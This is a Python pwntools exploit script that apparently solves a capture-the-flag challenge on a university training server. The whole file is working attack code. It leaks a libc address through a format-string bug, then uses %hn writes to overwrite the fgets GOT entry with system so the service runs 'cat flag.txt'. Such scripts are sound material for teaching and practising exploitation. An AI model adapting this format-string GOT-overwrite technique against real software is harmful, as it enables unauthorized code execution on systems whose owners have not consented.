from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50230

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin', env={"LD_PRELOAD": "./libc.so.6"})
    gdb.attach(conn)

libc = ELF("./libc.so.6")

system_libc_offset = libc.symbols["system"]
fgets_libc_offset = libc.symbols["fgets"]

got_fgets = 0x404010

conn.sendlineafter(b"> ", b"%37$p")                  # Use one of the useful address previously obtained
leak = int(conn.recvline(keepends=False), 16)

# What comes after the - was obtained using info symbols <addr>
libc_base = leak - (libc.symbols["__libc_start_main"] + 137)
print(f"Libc base address: {hex(libc_base)}")

# Compute the full addresses of our target functions
system_libc_address = libc_base + system_libc_offset
fgets_libc_address = libc_base + fgets_libc_offset

print(f"fgets address: {hex(fgets_libc_address)}")
print(f"system address: {hex(system_libc_address)}")

# Setup the payload used to write in the GOT entry
new_address = str(hex(system_libc_address))
char_to_print_ls = int(new_address[-4:], 16)            # Least significant part of the address
char_to_print_ms = int(new_address[-8:-4], 16)          # Most significant part of the address
print(f"What we will print: {hex(char_to_print_ms)} - {hex(char_to_print_ls)}")

payload = b"cat flag.txt    "

# Since we need to change the whole address in one go, we have to write 4 bytes, using two %hn
# %n will count the characters printed in the printf call, so we first have to write the 
# smaller half (in number of char) and then the bigger one. For the latter, we will print only an amount
# of char equal to the difference between the twos.

if(char_to_print_ms > char_to_print_ls):        # First we write the ls, then the ms
    payload += (f"%{(char_to_print_ls - len(payload))}c%12$hn").encode()        # Remove the char already printed
    payload += (f"%{(char_to_print_ms - char_to_print_ls)}c%13$hn").encode()
    payload += b" " * (8 - len(payload)%8)                                      # Makes the payload size multiple of 8
    payload += p64(got_fgets)                                                   # The two addressess we will print to
    payload += p64(got_fgets + 2)
else:                                           # Otherwise, swap the two
    payload += (f"%{(char_to_print_ms - len(payload))}c%12$hn").encode()
    payload += (f"%{(char_to_print_ls - char_to_print_ms)}c%13$hn").encode()
    payload += b" " * (8 - len(payload)%8)
    payload += p64(got_fgets + 2)                                               # Having swapped the pieces, we also swap the addresses
    payload += p64(got_fgets)

print(payload)

conn.sendlineafter(b'> ', payload)              # Send the payload and receive the flag

conn.recvuntil(b"U")
flag = (b"U" + conn.recvuntil(b"}")).decode()
conn.close()
print(flag)

